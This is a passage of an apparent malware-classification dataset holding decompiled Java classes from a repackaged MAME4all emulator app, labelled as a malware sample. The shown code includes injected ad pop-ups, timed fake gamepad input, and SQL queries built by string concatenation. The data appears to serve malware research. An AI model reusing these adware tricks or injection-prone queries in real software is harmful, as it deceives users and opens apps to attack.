cursor.getInt(scoreIndex) + ""           \n"";       cursor.moveToNext();     }     cursor.close();     this.mDB.close();     return result;   }   public String queryrank(  String score,  int model){     SQLiteDatabase db=getWritableDatabase();     Cursor c=db.query(TABLE_NAME,null,"" _score >= "" + score + "" and _model=""+ model,null,null,null,null,null);     String rank=String.valueOf(c.getCount());     Cursor cc=db.query(TABLE_NAME,null,"" _score < "" + score + "" and _model=""+ model,null,null,null,null,null);     if (cc.getCount() > 0) {       int mName=cc.getColumnIndex(""_name"");       int mScore=cc.getColumnIndex(""_score"");       int mModel=cc.getColumnIndex(""_model"");       int mRank=cc.getColumnIndex(""_rank"");       String aa="""";       String bb="""";       String ff="""";       String ee="""";       cc.moveToFirst();       while (!cc.isAfterLast()) {         if (cc.getString(mName) != null) {           aa=String.valueOf(aa) + "","" + cc.getString(mName);           bb=String.valueOf(bb) + "","" + String.valueOf(cc.getInt(mScore));           ff=String.valueOf(ff) + "","" + String.valueOf(cc.getInt(mModel));           ee=String.valueOf(ee) + "","" + String.valueOf(cc.getInt(mRank));         }         cc.moveToNext();       }       String[] aaa=aa.split("","");       String[] bbb=bb.split("","");       String[] modelArray=ff.split("","");       String[] ddd=ee.split("","");       for (int i=0; i < aaa.length; i++) {         if (aaa[i] != null && aaa[i] != """" && aaa[i].length() > 0) {           ContentValues values=new ContentValues();           values.put(""_name"",aaa[i]);           values.put(""_score"",Integer.valueOf(Integer.parseInt(bbb[i])));           values.put(""_model"",Integer.valueOf(Integer.parseInt(modelArray[i])));           values.put(""_rank"",Integer.valueOf(Integer.parseInt(ddd[i]) + 1));           db.update(TABLE_NAME,values,""_score = '"" + bbb[i] + ""'"",null);         }       }     }     c.close();     db.close();     return rank;   }   public Cursor getListViewCursorByModel(  int model){     Cursor cursor=null;     try {       this.mDB=getWritableDatabase();       cursor=this.mDB.query(TABLE_NAME,null,""_model="" + model,null,null,null,""_score desc"",null);       cursor.moveToFirst();       while (!cursor.isAfterLast()) {         cursor.moveToNext();       }     }  catch (    Exception e) {     }  finally {       this.mDB.close();     }     return cursor;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\Emulator.code","public class Emulator {   public static final int ASMCORES_KEY=7;   public static final int BPLUSX_KEY=5;   public static final int EXIT_GAME_KEY=2;   public static final int EXIT_PAUSE=9;   public static final int FPS_SHOWED_KEY=1;   public static final int HIDE_LR__KEY=4;   public static final int IDLE_WAIT=10;   public static final int INFOWARN_KEY=8;   public static final int LAND_BUTTONS_KEY=3;   public static final int WAYS_STICK_KEY=6;   static long mLastClick;   static long millis;   private static MAME4all mm=null;   private static boolean isEmulating=false;   private static boolean paused=false;   private static Object lock1=new Object();   private static Object lock2=new Object();   private static SurfaceHolder holder=null;   private static Bitmap emuBitmap=Bitmap.createBitmap(320,240,Bitmap.Config.RGB_565);   private static ByteBuffer screenBuff=null;   private static int[] screenBuffPx=new int[921600];   private static boolean frameFiltering=false;   private static Paint emuPaint=null;   private static Paint debugPaint=new Paint();   private static Matrix mtx=new Matrix();   private static int window_width=320;   private static int window_height=240;   private static int emu_width=320;   private static int emu_height=240;   private static AudioTrack audioTrack=null;   private static boolean isThreadedSound=false;   private static boolean isDebug=false;   private static int videoRenderMode=2;   private static boolean inMAME=false;   private static int overlayFilterType=1;   static long j=0;   static int i=0;   static int fps=0;   private static SoundThread soundT=new SoundThread();   private static VideoThread videoT=new VideoThread();   public static native int getValue(  int i2);   protected static native void init(  String str,  String str2);   public static native synchronized void setAnalogData(  int i2,  float f,  float f2);   public static native synchronized void setPadData(  int i2,  long j2);   public static native void setValue(  int i2,  int i3); static {     try {       System.loadLibrary(""mame4all-jni"");     }  catch (    Error e) {       e.printStackTrace();     }     debugPaint.setARGB(255,255,255,255);     debugPaint.setStyle(Paint.Style.STROKE);     debugPaint.setTextSize(16.0f);     mLastClick=0L;   }   public static boolean isEmulating(){     return isEmulating;   }   public static int[] getScreenBuffPx(){     return screenBuffPx;   }   public static boolean isFrameFiltering(){     return frameFiltering;   }   public static int getWindow_width(){     return window_width;   }   public static int getWindow_height(){     return window_height;   }   public static boolean isInMAME(){     return inMAME;   }   public static int getOverlayFilterType(){     return overlayFilterType;   }   public static void setOverlayFilterType(  int overlayFilterType2){     overlayFilterType=overlayFilterType2;   }   public static int getEmulatedWidth(){     return emu_width;   }   public static int getEmulatedHeight(){     return emu_height;   }   public static boolean isThreadedSound(){     return isThreadedSound;   }   public static void setThreadedSound(  boolean isThreadedSound2){     isThreadedSound=isThreadedSound2;   }   public static boolean isDebug(){     return isDebug;   }   public static void setDebug(  boolean isDebug2){     isDebug=isDebug2;   }   public static int getVideoRenderMode(){     return videoRenderMode;   }   public static void setVideoRenderMode(  int videoRenderMode2){     videoRenderMode=videoRenderMode2;   }   public static Paint getEmuPaint(){     return emuPaint;   }   public static Paint getDebugPaint(){     return debugPaint;   }   public static Matrix getMatrix(){     return mtx;   }   public static SurfaceHolder getHolder(){     return holder;   }   public static Bitmap getEmuBitmap(){     return emuBitmap;   }   public static ByteBuffer getScreenBuffer(){     return screenBuff;   }   public static void setHolder(  SurfaceHolder value){ synchronized (lock1) {       if (value != null) {         holder=value;         holder.setFormat(-1);         holder.setKeepScreenOn(true);         videoT.start();       }  else {         videoT.stop();         holder=null;       }     }   }   public static Canvas lockCanvas(){     if (holder != null) {       return holder.lockCanvas();     }     return null;   }   public static void unlockCanvas(  Canvas c){     if (holder != null && c != null) {       holder.unlockCanvasAndPost(c);     }   }   public static void setMAME4all(  MAME4all mm2){     mm=mm2;     videoT.setMAME4all(mm2);   }   public static void setWindowSize(  int w,  int h){     window_width=w;     window_height=h;     if (videoRenderMode != 3) {       mtx.setScale(window_width / emu_width,window_height / emu_height);     }   }   public static void setFrameFiltering(  boolean value){     frameFiltering=value;     if (value) {       emuPaint=new Paint();       emuPaint.setFilterBitmap(true);     }  else {       emuPaint=null;     }   }   static void bitblt(  ByteBuffer sScreenBuff,  boolean inMAME2){     if (paused) { synchronized (lock2) {         try {           if (paused) {             lock2.wait();           }         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }     } synchronized (lock1) {       screenBuff=sScreenBuff;       inMAME=inMAME2;       if (videoRenderMode == 3) {         ((EmulatorViewGL)mm.getEmuView()).requestRender();       }  else       if (videoRenderMode == 2) {         videoT.update();       }  else       if (videoRenderMode == 4) {         videoT.update();       }  else       if (holder != null) {         Canvas canvas=holder.lockCanvas();         sScreenBuff.rewind();         emuBitmap.copyPixelsFromBuffer(sScreenBuff);         i++;         canvas.concat(mtx);         canvas.drawBitmap(emuBitmap,0.0f,0.0f,emuPaint);         if (isDebug) {           canvas.drawText(""Normal fps:"" + fps + "" ""+ inMAME2,5.0f,40.0f,debugPaint);           if (System.currentTimeMillis() - millis >= 1000) {             fps=i;             i=0;             millis=System.currentTimeMillis();           }         }         holder.unlockCanvasAndPost(canvas);       }     }   }   public static void changeVideo(  int newWidth,  int newHeight){     GLRenderer r; synchronized (lock1) {       for (int i2=0; i2 < 4; i2++) {         setPadData1(i2,0L);       }       emu_width=newWidth;       emu_height=newHeight;       emuBitmap=Bitmap.createBitmap(newWidth,newHeight,Bitmap.Config.RGB_565);       mtx.setScale(window_width / emu_width,window_height / emu_height);       if (videoRenderMode == 3 && (r=(GLRenderer)((EmulatorViewGL)mm.getEmuView()).getRender()) != null) {         r.changedEmulatedSize();       }       mm.runOnUiThread(new Runnable(){         @Override public void run(){           Emulator.mm.getMainHelper().updateMAME4all();         }       } );     }   }   public static void initAudio(  int freq,  boolean stereo){     int channelConfig=stereo ? 3 : 2;     int bufferSize=AudioTrack.getMinBufferSize(freq,channelConfig,2) * 2;     audioTrack=new AudioTrack(3,freq,channelConfig,2,bufferSize,1);     audioTrack.play();   }   public static void endAudio(){     audioTrack.stop();     audioTrack.release();     audioTrack=null;   }   public static void writeAudio(  byte[] b,  int sz){     if (audioTrack != null) {       if (isThreadedSound && soundT != null) {         soundT.setAudioTrack(audioTrack);         soundT.writeSample(b,sz);       }  else {         audioTrack.write(b,0,sz);       }     }   }   public static void pause(){     utility.Log(""EMULATOR"",""KEY PAUSE"");     if (isEmulating) {       paused=true;     }     if (audioTrack != null) {       audioTrack.pause();     }     videoT.stop();   }   public static void resume(){     utility.Log(""EMULATOR"",""KEY RESUME"");     if (audioTrack != null) {       audioTrack.play();     }     if (isEmulating) {       setValue(9,1); synchronized (lock2) {         paused=false;         lock2.notify();       }     }     videoT.start();   }   public static void emulate(  final String libPath,  final String resPath){     if (!isEmulating) {       Thread t=new Thread(new Runnable(){         @Override public void run(){           Emulator.isEmulating=true;           Emulator.init(libPath,resPath);         }       } ,""emulator-Thread"");       t.start();     }   }   public static boolean isLastClick(){     return (mm == null || mm.bIsFinish) && Math.abs(mLastClick - System.currentTimeMillis()) < 2000;   }   public static synchronized void setPadData1(  int i2,  long data){ synchronized (Emulator.class) {       if ((8192 & data) != 0 || (16384 & data) != 0) {         mLastClick=System.currentTimeMillis();       }       if (i2 == 3 && mm != null) {         mm.OnStart(20);       }       utility.Log("""",""setPadData1 "" + i2 + "" ""+ String.format(""%1$#9x"",Long.valueOf(data)));       setPadData(i2,data);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\FileExplorer.code","public class FileExplorer {   private static final String TAG=""FE_PATH"";   ListAdapter adapter;   private String chosenFile;   private Item[] fileList;   protected MAME4all mm;   ArrayList<String> traversed=new ArrayList<>();   private Boolean firstLvl=true;   private File path=new File(""/"");   public File getPath(){     return this.path;   }   public FileExplorer(  MAME4all mm){     this.mm=null;     this.mm=mm;   }   private void loadFileList(){     if (this.path.exists()) {       FilenameFilter filter=new FilenameFilter(){         @Override public boolean accept(        File dir,        String filename){           File sel=new File(dir,filename);           return sel.isDirectory() && !sel.isHidden();         }       } ;       String[] fList=this.path.list(filter);       if (fList == null) {         fList=new String[0];       }       this.fileList=new Item[fList.length];       for (int i=0; i < fList.length; i++) {         this.fileList[i]=new Item(fList[i],Integer.valueOf(R.drawable.file_icon));         File sel=new File(this.path,fList[i]);         if (sel.isDirectory()) {           this.fileList[i].icon=R.drawable.directory_icon;           Log.d(""DIRECTORY"",this.fileList[i].file);         }  else {           Log.d(""FILE"",this.fileList[i].file);         }       }       if (!this.firstLvl.booleanValue()) {         Item[] temp=new Item[this.fileList.length + 1];         for (int i2=0; i2 < this.fileList.length; i2++) {           temp[i2 + 1]=this.fileList[i2];         }         temp[0]=new Item(""Up"",Integer.valueOf(R.drawable.directory_up));         this.fileList=temp;       }     }  else {       Log.e(TAG,""path does not exist"");     }     this.adapter=new ArrayAdapter<Item>(this.mm,android.R.layout.select_dialog_item,android.R.id.text1,this.fileList){       @Override public View getView(      int position,      View convertView,      ViewGroup parent){         View view=super.getView(position,convertView,parent);         TextView textView=(TextView)view.findViewById(android.R.id.text1);         textView.setCompoundDrawablesWithIntrinsicBounds(FileExplorer.this.fileList[position].icon,0,0,0);         int dp5=(int)((5.0f * FileExplorer.this.mm.getResources().getDisplayMetrics().density) + 0.5f);         textView.setCompoundDrawablePadding(dp5);         return view;       }     } ;   } public class Item {     public String file;     public int icon;     public Item(    String file,    Integer icon){       this.file=file;       this.icon=icon.intValue();     }     public String toString(){       return this.file;     }   }   public Dialog create(){     loadFileList();     AlertDialog.Builder builder=new AlertDialog.Builder(this.mm);     if (this.fileList == null) {       Log.e(TAG,""No files loaded"");       Dialog dialog=builder.create();       return dialog;     }     builder.setTitle(""Selected: "" + this.path.getPath());     builder.setAdapter(this.adapter,new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog2,      int which){         FileExplorer.this.chosenFile=FileExplorer.this.fileList[which].file;         File sel=new File(FileExplorer.this.path + ""/"" + FileExplorer.this.chosenFile);         if (sel.isDirectory()) {           FileExplorer.this.firstLvl=false;           FileExplorer.this.traversed.add(FileExplorer.this.chosenFile);           FileExplorer.this.fileList=null;           FileExplorer.this.path=new File(new StringBuilder().append(sel).toString());           FileExplorer.this.mm.removeDialog(8);           FileExplorer.this.mm.showDialog(8);           Log.d(FileExplorer.TAG,FileExplorer.this.path.getAbsolutePath());           return;         }         if (FileExplorer.this.chosenFile.equalsIgnoreCase(""up"") && !sel.exists()) {           String s=FileExplorer.this.traversed.remove(FileExplorer.this.traversed.size() - 1);           FileExplorer.this.path=new File(FileExplorer.this.path.toString().substring(0,FileExplorer.this.path.toString().lastIndexOf(s)));           FileExplorer.this.fileList=null;           if (FileExplorer.this.traversed.isEmpty()) {             FileExplorer.this.firstLvl=true;           }           FileExplorer.this.mm.removeDialog(8);           FileExplorer.this.mm.showDialog(8);           Log.d(FileExplorer.TAG,FileExplorer.this.path.getAbsolutePath());         }       }     } );     builder.setPositiveButton(""Done"",new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog2,      int id){         String res_dir=null;         try {           res_dir=String.valueOf(FileExplorer.this.path.getCanonicalPath()) + ""/MAME4all/"";         }  catch (        IOException e) {           e.printStackTrace();         }         if (res_dir.startsWith(""//"")) {           res_dir=res_dir.substring(1);         }         DialogHelper.savedDialog=-1;         FileExplorer.this.mm.removeDialog(8);         if (FileExplorer.this.mm.getMainHelper().ensureROMsDir(res_dir)) {           FileExplorer.this.mm.getPrefsHelper().setROMsDIR(res_dir);           FileExplorer.this.mm.runMAME4all();         }       }     } );     builder.setCancelable(false);     Dialog dialog2=builder.show();     return dialog2;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\GLRenderer.code","public class GLRenderer implements GLSurfaceView.Renderer {   private FloatBuffer mFVertexBuffer;   private ShortBuffer mIndexBuffer;   private FloatBuffer mTexBuffer;   protected int mTex=-1;   protected int[] mtexBuf=new int[1];   protected ShortBuffer shortBuffer=null;   protected boolean textureInit=false;   protected boolean force10=false;   protected boolean smooth=false;   protected MAME4all mm=null;   private final int[] mTextureName=new int[1];   private final int[] mCrop=new int[4];   public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public void changedEmulatedSize(){     Log.v(""mm"",""changedEmulatedSize "" + this.shortBuffer + "" ""+ Emulator.getScreenBuffer());     if (Emulator.getScreenBuffer() != null) {       this.shortBuffer=Emulator.getScreenBuffer().asShortBuffer();       this.textureInit=false;     }   }   @Override public void onSurfaceCreated(  GL10 gl,  EGLConfig config){     Log.v(""mm"",""onSurfaceCreated "");     gl.glHint(3152,4353);     gl.glClearColor(0.5f,0.5f,0.5f,1.0f);     gl.glClear(16640);     gl.glShadeModel(7424);     gl.glEnable(3553);     gl.glDisable(3024);     gl.glDisable(2896);     gl.glDisable(3042);     gl.glDisable(2884);     gl.glDisable(2929);     gl.glDisable(32925);     if (!(gl instanceof GL11Ext) || this.force10) {       gl.glEnableClientState(32884);       gl.glEnableClientState(32888);     }     this.textureInit=false;   }   @Override public void onSurfaceChanged(  GL10 gl,  int w,  int h){     Log.v(""mm"",""sizeChanged: ==> new Viewport: ["" + w + "",""+ h+ ""]"");     gl.glViewport(0,0,w,h);     gl.glMatrixMode(5889);     gl.glLoadIdentity();     gl.glOrthof(0.0f,w,h,0.0f,-1.0f,1.0f);     gl.glFrontFace(2305);     gl.glClearColor(0.5f,0.5f,0.5f,1.0f);     gl.glClear(16640);     this.textureInit=false;   }   protected boolean isSmooth(){     return Emulator.isFrameFiltering();   }   protected int loadTexture(  GL10 gl){     int textureName=-1;     if (gl != null) {       gl.glGenTextures(1,this.mTextureName,0);       textureName=this.mTextureName[0];       gl.glBindTexture(3553,textureName);       this.smooth=isSmooth();       gl.glTexParameterf(3553,10241,9728.0f);       gl.glTexParameterf(3553,10240,this.smooth ? 9729 : 9728);       gl.glTexParameterf(3553,10242,33071.0f);       gl.glTexParameterf(3553,10243,33071.0f);       gl.glTexEnvf(8960,8704,7681.0f);       int error=gl.glGetError();       if (error != 0) {         Log.e(""SpriteMethodTest"",""Texture Load GLError: "" + error);       }     }     return textureName;   }   public void initVertexes(  GL10 gl){     if (!(gl instanceof GL11Ext) || this.force10) {       int width=Emulator.getEmulatedWidth();       int height=Emulator.getEmulatedHeight();       ByteBuffer vbb=ByteBuffer.allocateDirect(48);       vbb.order(ByteOrder.nativeOrder());       this.mFVertexBuffer=vbb.asFloatBuffer();       ByteBuffer tbb=ByteBuffer.allocateDirect(32);       tbb.order(ByteOrder.nativeOrder());       this.mTexBuffer=tbb.asFloatBuffer();       ByteBuffer ibb=ByteBuffer.allocateDirect(8);       ibb.order(ByteOrder.nativeOrder());       this.mIndexBuffer=ibb.asShortBuffer();       float scaleX=Emulator.getWindow_width() / Emulator.getEmulatedWidth();       float scaleY=Emulator.getWindow_height() / Emulator.getEmulatedHeight();       float[] coords={(int)(width * scaleX),0.0f,0.0f,(int)(width * scaleX),(int)(height * scaleY),0.0f,0.0f,0.0f,0.0f,0.0f,(int)(height * scaleY),0.0f};       int width_p2=Emulator.getEmulatedWidth() > 512 ? IController.L1_VALUE : IController.SELECT_VALUE;       float[] texturCoords={1.0f / (width_p2 / width),0.0f,0.0f,1.0f / (width_p2 / width),1.0f / (IController.SELECT_VALUE / height),0.0f,0.0f,0.0f,0.0f,0.0f,1.0f / (IController.SELECT_VALUE / height),0.0f};       for (int i=0; i < 4; i++) {         for (int j=0; j < 3; j++) {           this.mFVertexBuffer.put(coords[(i * 3) + j]);         }       }       for (int i2=0; i2 < 4; i2++) {         for (int j2=0; j2 < 2; j2++) {           this.mTexBuffer.put(texturCoords[(i2 * 3) + j2]);         }       }       for (int i3=0; i3 < 4; i3++) {         this.mIndexBuffer.put((short)i3);       }       this.mFVertexBuffer.position(0);       this.mTexBuffer.position(0);       this.mIndexBuffer.position(0);     }   }   private void releaseTexture(  GL10 gl){     if (this.mTex != -1) {       gl.glDeleteTextures(1,new int[]{this.mTex},0);     }   }   public void dispose(  GL10 gl){     releaseTexture(gl);   }   @Override public void onDrawFrame(  GL10 gl){     if (this.shortBuffer == null) {       ByteBuffer buf=Emulator.getScreenBuffer();       if (buf != null) {         this.shortBuffer=buf.asShortBuffer();       }  else {         return;       }     }     if (this.mTex == -1 || this.smooth != isSmooth()) {       this.mTex=loadTexture(gl);     }     gl.glActiveTexture(this.mTex);     gl.glClientActiveTexture(this.mTex);     this.shortBuffer.rewind();     gl.glBindTexture(3553,this.mTex);     if (!this.textureInit) {       initVertexes(gl);       gl.glTexImage2D(3553,0,6407,Emulator.getEmulatedWidth() > 512 ? IController.L1_VALUE : IController.SELECT_VALUE,IController.SELECT_VALUE,0,6407,33635,this.shortBuffer);       this.textureInit=true;     }     int width=Emulator.getEmulatedWidth();     int height=Emulator.getEmulatedHeight();     gl.glTexSubImage2D(3553,0,0,0,width,height,6407,33635,this.shortBuffer);     if ((gl instanceof GL11Ext) && !this.force10) {       this.mCrop[0]=0;       this.mCrop[1]=height;       this.mCrop[2]=width;       this.mCrop[3]=-height;       ((GL11)gl).glTexParameteriv(3553,35741,this.mCrop,0);       ((GL11Ext)gl).glDrawTexiOES(0,0,0,Emulator.getWindow_width(),Emulator.getWindow_height());       return;     }     gl.glVertexPointer(3,5126,0,this.mFVertexBuffer);     gl.glTexCoordPointer(2,5126,0,this.mTexBuffer);     gl.glDrawElements(5,4,5123,this.mIndexBuffer);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\HelpActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4901ac60"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\Item.code","public class Item {   public String file;   public int icon;   public Item(  String file,  Integer icon){     this.file=file;     this.icon=icon.intValue();   }   public String toString(){     return this.file;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\MAME4all.code","public class MAME4all extends Activity {   public static boolean mbIsRunning=false;   public static boolean sbisminfirst=false;   PopupWindow mAdWindow;   PopupWindow mPopupWindow;   protected View emuView=null;   protected InputView inputView=null;   protected FilterView filterView=null;   protected MainHelper mainHelper=null;   protected MenuHelper menuHelper=null;   protected PrefsHelper prefsHelper=null;   protected DialogHelper dialogHelper=null;   protected InputHandler inputHandler=null;   protected FileExplorer fileExplore=null;   View mProgressView=null;   public float xyrate=1.0f;   View mAdView=null;   View gameView=null;   public ViewGroup mAdViewGroup=null;   List<Integer> mlstCon=new ArrayList();   localAdView mLocalAdView=null;   boolean bIsFinish=false;   Handler mHandler=new Handler(){     @Override public void handleMessage(    Message msg){       if (msg.what == 4) {         MAME4all.this.mHandler.sendEmptyMessageDelayed(4,200000L);       }       if (msg.what == 2) {         MAME4all.this.mHandler.removeMessages(2);         Emulator.setPadData1(0,512L);         MAME4all.this.Sleep(100);         Emulator.setPadData1(0,0L);         MAME4all.this.Sleep(100);         Emulator.setPadData1(0,256L);         MAME4all.this.Sleep(100);         Emulator.setPadData1(0,0L);         MAME4all.this.mHandler.sendEmptyMessageDelayed(2,5000L);         return;       }       if (msg.what == 1) {         MAME4all.this.mHandler.removeMessages(1);         if (!Emulator.isInMAME()) {           Emulator.setPadData1(0,8192L);           MAME4all.this.Sleep(100);           Emulator.setPadData1(0,0L);           MAME4all.this.mHandler.sendEmptyMessageDelayed(1,300L);           MAME4all.this.bIsFinish=false;           return;         }         if (!MAME4all.this.bIsFinish) {           MAME4all.this.mlstCon.add(Integer.valueOf(IController.SELECT_VALUE));           MAME4all.this.mlstCon.add(Integer.valueOf(IController.START_VALUE));           MAME4all.this.mHandler.sendEmptyMessageDelayed(1,10000L);           MAME4all.this.bIsFinish=true;           return;         }         if (MAME4all.this.gameView != null && MAME4all.this.gameView.getVisibility() != 0) {           MAME4all.this.gameView.setVisibility(0);         }         if (MAME4all.this.mProgressView != null && MAME4all.this.mProgressView.getVisibility() == 0) {           MAME4all.this.mProgressView.setVisibility(8);         }         if (MAME4all.this.mlstCon.size() > 0) {           int cmd=MAME4all.this.mlstCon.remove(0).intValue();           Emulator.setPadData1(0,cmd);           MAME4all.this.Sleep(100);           Emulator.setPadData1(0,0L);           Log.v("""",""isEmulating:"" + Emulator.isEmulating());           Log.v("""",""isInMAME:"" + Emulator.isInMAME());         }         if (MAME4all.this.mlstCon.size() > 0) {           MAME4all.this.mHandler.sendEmptyMessageDelayed(1,1000L);           return;         }         MAME4all.this.mlstCon.add(Integer.valueOf(IController.SELECT_VALUE));         MAME4all.this.mlstCon.add(Integer.valueOf(IController.START_VALUE));         Log.v("""",""isEmulating:"" + Emulator.isEmulating());         Log.v("""",""isInMAME:"" + Emulator.isInMAME());         Log.v("""",""isFrameFiltering:"" + Emulator.isFrameFiltering());         MAME4all.this.mHandler.sendEmptyMessageDelayed(1,60000L);       }     }   } ;   long mLastClick=0;   public FileExplorer getFileExplore(){     return this.fileExplore;   }   public MenuHelper getMenuHelper(){     return this.menuHelper;   }   public PrefsHelper getPrefsHelper(){     return this.prefsHelper;   }   public MainHelper getMainHelper(){     return this.mainHelper;   }   public DialogHelper getDialogHelper(){     return this.dialogHelper;   }   public View getEmuView(){     return this.emuView;   }   public InputView getInputView(){     return this.inputView;   }   public FilterView getFilterView(){     return this.filterView;   }   public InputHandler getInputHandler(){     return this.inputHandler;   }   @Override public void onCreate(  Bundle savedInstanceState){     int type;     super.onCreate(savedInstanceState);     WindowManager windowManager=getWindowManager();     Display display=windowManager.getDefaultDisplay();     int nWinWidth=display.getWidth();     int nWinHeight=display.getHeight();     mbIsRunning=true;     setContentView(R.layout.main);     utility.Instance().SaveStringPreference(this,PrefsHelper.PREF_ROMsDIR,String.valueOf(config.getSdcardDir()) + mainActivity.sRomsDir);     utility.Instance().SaveBoolPreference(this,PrefsHelper.PREF_GLOBAL_SHOW_INFOWARNINGS,false);     this.prefsHelper=new PrefsHelper(this);     this.dialogHelper=new DialogHelper(this);     this.mainHelper=new MainHelper(this);     this.fileExplore=new FileExplorer(this);     this.menuHelper=new MenuHelper(this);     this.mainHelper.copyFiles();     this.inputHandler=InputHandlerFactory.createInputHandler(this);     FrameLayout fl=(FrameLayout)findViewById(R.id.EmulatorFrame);     this.gameView=null;     if (this.prefsHelper.getVideoRenderMode() == 3) {       this.gameView=getLayoutInflater().inflate(R.layout.emuview_gl,(ViewGroup)null);       this.emuView=this.gameView.findViewById(R.id.EmulatorViewGL);     }  else     if (this.prefsHelper.getVideoRenderMode() == 4) {       this.gameView=getLayoutInflater().inflate(R.layout.emuview_hw,(ViewGroup)null);       this.emuView=this.gameView.findViewById(R.id.EmulatorViewHW);     }  else {       this.gameView=getLayoutInflater().inflate(R.layout.emuview_sw,(ViewGroup)null);       this.emuView=this.gameView.findViewById(R.id.EmulatorViewSW);     }     this.xyrate=1.33f;     if (getResources().getString(R.string.xyrate) != null) {       try {         this.xyrate=Float.parseFloat(getResources().getString(R.string.xyrate));       }  catch (      Exception e) {         this.xyrate=1.33f;       }     }     if (getResources().getString(R.string.isminfirst) != null && getResources().getString(R.string.isminfirst).contains(""yes"")) {       sbisminfirst=true;     }     int nwidth=(int)Math.min(nWinWidth,nWinHeight * this.xyrate);     if (!sbisminfirst) {       nwidth=nWinWidth;     }     fl.addView(this.gameView,new ViewGroup.LayoutParams(nwidth,-1));     this.inputView=(InputView)findViewById(R.id.InputView);     ((IEmuView)this.emuView).setMAME4all(this);     this.inputView.setMAME4all(this);     Emulator.setMAME4all(this);     View frame=findViewById(R.id.EmulatorFrame);     frame.setOnTouchListener(this.inputHandler);     if ((this.prefsHelper.getPortraitOverlayFilterType() != 1 && this.mainHelper.getscrOrientation() == 1) || (this.prefsHelper.getLandscapeOverlayFilterType() != 1 && this.mainHelper.getscrOrientation() == 2)) {       if (this.mainHelper.getscrOrientation() == 1) {         type=this.prefsHelper.getPortraitOverlayFilterType();       }  else {         type=this.prefsHelper.getLandscapeOverlayFilterType();       }       int dwb_id=-1; switch (type) { case 2: case 3:         dwb_id=R.drawable.scanline_1;       break; case 4: case 5:     dwb_id=R.drawable.scanline_2;   break; case 6: case 7: dwb_id=R.drawable.crt_1; break; case 8: case 9: dwb_id=R.drawable.crt_2; break; } if (dwb_id != -1) { getLayoutInflater().inflate(R.layout.filterview,fl); this.filterView=(FilterView)findViewById(R.id.FilterView); Bitmap bmp=BitmapFactory.decodeResource(getResources(),dwb_id); BitmapDrawable bitmapDrawable=new BitmapDrawable(bmp); bitmapDrawable.setTileModeXY(Shader.TileMode.REPEAT,Shader.TileMode.REPEAT); int alpha=0; if (type == 2) { alpha=130; }  else if (type == 3) { alpha=180; }  else if (type == 4) { alpha=100; }  else if (type == 5) { alpha=150; }  else if (type == 6) { alpha=50; }  else if (type == 7) { alpha=130; }  else if (type == 8) { alpha=50; }  else if (type == 9) { alpha=120; } bitmapDrawable.setAlpha(alpha); this.filterView.setBackgroundDrawable(bitmapDrawable); this.filterView.setMAME4all(this); } } this.emuView.setOnKeyListener(this.inputHandler); this.emuView.setOnTouchListener(this.inputHandler); this.inputView.setOnTouchListener(this.inputHandler); this.inputView.setOnKeyListener(this.inputHandler); this.mainHelper.updateMAME4all(); if (!Emulator.isEmulating()) { if (this.prefsHelper.getROMsDIR() == null) { if (DialogHelper.savedDialog == -1) { showDialog(9); } }  else { getMainHelper().ensureROMsDir(this.prefsHelper.getROMsDIR()); runMAME4all(); } } if (mainActivity.bIsAutocoin) { this.mHandler.sendEmptyMessageDelayed(2,8000L); } this.mProgressView=findViewById(R.id.progress); this.gameView.setVisibility(4); this.mHandler.postDelayed(new Runnable(){ @Override public void run(){ MAME4all.AddAdview(MAME4all.this,null); myazcover.instance().showazad(MAME4all.this); } } ,2000L); } public static void AddAdview(Activity ctx,View adview){ if (ctx != null && adview == null) { View adview2=new localAdView(ctx,null); FrameLayout.LayoutParams localLayoutParams=new FrameLayout.LayoutParams(-1,-2); localLayoutParams.bottomMargin=0; localLayoutParams.leftMargin=190; ctx.addContentView(adview2,localLayoutParams); } } @Override public boolean dispatchTouchEvent(MotionEvent ev){ if (this.mAdViewGroup == null || !this.mAdViewGroup.dispatchTouchEvent(ev)) { return super.dispatchTouchEvent(ev); } return true; } void Sleep(int n){ try { Thread.sleep(n); }  catch (InterruptedException e) { e.printStackTrace(); } } public void OnStart(int flag){ utility.Log("""",""OnStart ""); if (Math.abs(this.mLastClick - System.currentTimeMillis()) >= 10000) { this.mLastClick=System.currentTimeMillis(); this.mHandler.sendEmptyMessageDelayed(1,10L); this.mHandler.sendEmptyMessageDelayed(4,200000L); this.mlstCon.add(Integer.valueOf(IController.SELECT_VALUE)); this.mlstCon.add(Integer.valueOf(IController.START_VALUE)); } } public void runMAME4all(){ Emulator.emulate(this.mainHelper.getLibDir(),this.prefsHelper.getROMsDIR()); } @Override public boolean onCreateOptionsMenu(Menu menu){ if (Emulator.isLastClick() || this.menuHelper == null || !this.menuHelper.createOptionsMenu(menu)) { return super.onCreateOptionsMenu(menu); } return true; } @Override public boolean onPrepareOptionsMenu(Menu menu){ if (Emulator.isLastClick() || this.menuHelper == null || !this.menuHelper.prepareOptionsMenu(menu)) { return super.onPrepareOptionsMenu(menu); } return true; } @Override public boolean onOptionsItemSelected(MenuItem item){ if (this.menuHelper == null || !this.menuHelper.optionsItemSelected(item)) { return super.onOptionsItemSelected(item); } return true; } @Override protected void onActivityResult(int requestCode,int resultCode,Intent data){ super.onActivityResult(requestCode,resultCode,data); if (this.mainHelper != null) { this.mainHelper.activityResult(requestCode,resultCode,data); } } @Override protected void onResume(){ 